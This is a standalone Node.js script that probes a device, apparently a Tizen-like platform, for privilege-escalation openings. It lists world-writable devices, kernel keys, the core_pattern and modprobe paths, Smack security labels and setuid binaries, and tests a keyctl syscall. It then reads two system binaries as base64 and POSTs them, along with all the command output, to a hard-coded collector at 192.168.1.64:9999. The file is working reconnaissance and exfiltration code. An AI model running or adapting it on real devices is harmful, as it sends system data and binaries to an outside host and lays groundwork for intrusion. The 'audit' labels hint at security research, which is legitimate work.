"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function b64(p) {
    try {
        return fs.readFileSync(p).toString("base64");
    } catch (e) {
        return "ERR " + e.message;
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.dev_listing = run("ls -la /dev");
out.dev_worldwritable = run("ls -la /dev | grep 'rw-rw-rw'");
out.proc_keys = run("head -5 /proc/keys; echo ---; cat /proc/key-users");
out.important_bins = run("ls -la /usr/bin/wasutility /usr/bin/wascmd /usr/bin/telephony-util /usr/sbin/sdbd /usr/sbin/modprobe /usr/bin/python /usr/bin/su /bin/su /usr/bin/passwd 2>&1");
out.wasutility_run = run("wasutility --help 2>&1 | head -20; echo ===; wascmd --help 2>&1 | head -20");
out.python_ver = run("python --version 2>&1");
out.core_pattern = run("cat /proc/sys/kernel/core_pattern; ls -la /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe 2>&1");
out.proc_modules = run("head -40 /proc/modules");
out.ptmx = run("ls -la /dev/ptmx /dev/pts 2>&1; ls -la /dev/mem /dev/kmem /dev/fuse 2>&1");
out.smack_label = run("cat /proc/self/attr/current 2>&1; ls -Z /usr/bin/wasutility /usr/bin/wascmd /usr/bin/telephony-util /usr/sbin/sdbd 2>&1");
out.smack_sys = run("ls -la /sys/fs/smack/ 2>&1 | head -20");
out.tmp_state = run("ls -la /tmp | head; mount | grep tmp");
out.keyctl_test = run("python -c \"import ctypes; libc=ctypes.CDLL(None); r=libc.syscall(311,5,-1,0,0); print('keyctl r=',r)\" 2>&1");

var bins = {};
bins.wasutility = b64("/usr/bin/wasutility");
bins.wascmd = b64("/usr/bin/wascmd");
post("/audit7_files", bins);

post("/audit7", out);
